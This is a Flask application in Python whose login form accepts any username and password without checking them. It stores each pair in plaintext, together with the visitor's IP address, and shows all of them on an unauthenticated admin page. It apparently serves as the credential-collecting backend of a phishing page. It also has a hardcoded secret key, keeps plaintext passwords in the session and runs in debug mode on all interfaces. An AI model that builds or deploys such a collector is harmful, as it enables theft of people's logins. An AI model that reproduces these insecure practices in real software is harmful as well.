from flask import Flask, render_template, request, redirect, session, url_for
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'secret123'
DB_NAME = 'data.db'

# Initialize database
def init_db():
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                password TEXT,
                ip TEXT
            )
        ''')
        conn.commit()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip = request.remote_addr

        session['username'] = username
        session['password'] = password
        session['ip'] = ip

        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO users (username, password, ip) VALUES (?, ?, ?)',
                      (username, password, ip))
            conn.commit()

        return redirect('/main')

    return render_template('login.html')

@app.route('/main')
def main():
    if 'username' not in session:
        return redirect('/login')

    return render_template('main.html', username=session['username'], password=session['password'], ip=session['ip'])

@app.route('/quit')
def quit():
    session.clear()
    return redirect('/')

@app.route('/admin/view-logins')
def view_logins():
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('SELECT username, password, ip FROM users')
        users = c.fetchall()
    return render_template('view.html', users=users)

@app.route('/last')
def last():
    return render_template('last.html')

if __name__ == '__main__':
    init_db()
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
